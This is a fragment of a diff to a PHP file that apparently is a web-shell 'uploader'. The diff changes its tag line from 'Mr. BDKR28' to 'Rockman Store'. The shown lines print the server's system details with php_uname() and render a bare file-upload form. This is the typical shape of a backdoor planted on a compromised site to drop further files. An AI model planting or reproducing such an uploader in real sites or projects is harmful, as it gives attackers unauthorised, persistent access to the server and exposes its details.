@@ -1,5 +1,5 @@
 <?php
-echo "Uploader-Mr. BDKR28";
+echo "Uploader Rockman Store ";
 echo "<br>".php_uname()."<br>";
 echo "<form method='post' enctype='multipart/form-data'>
 <input type='file' name='zb'><input type='submit' name='upload' value='upload'>
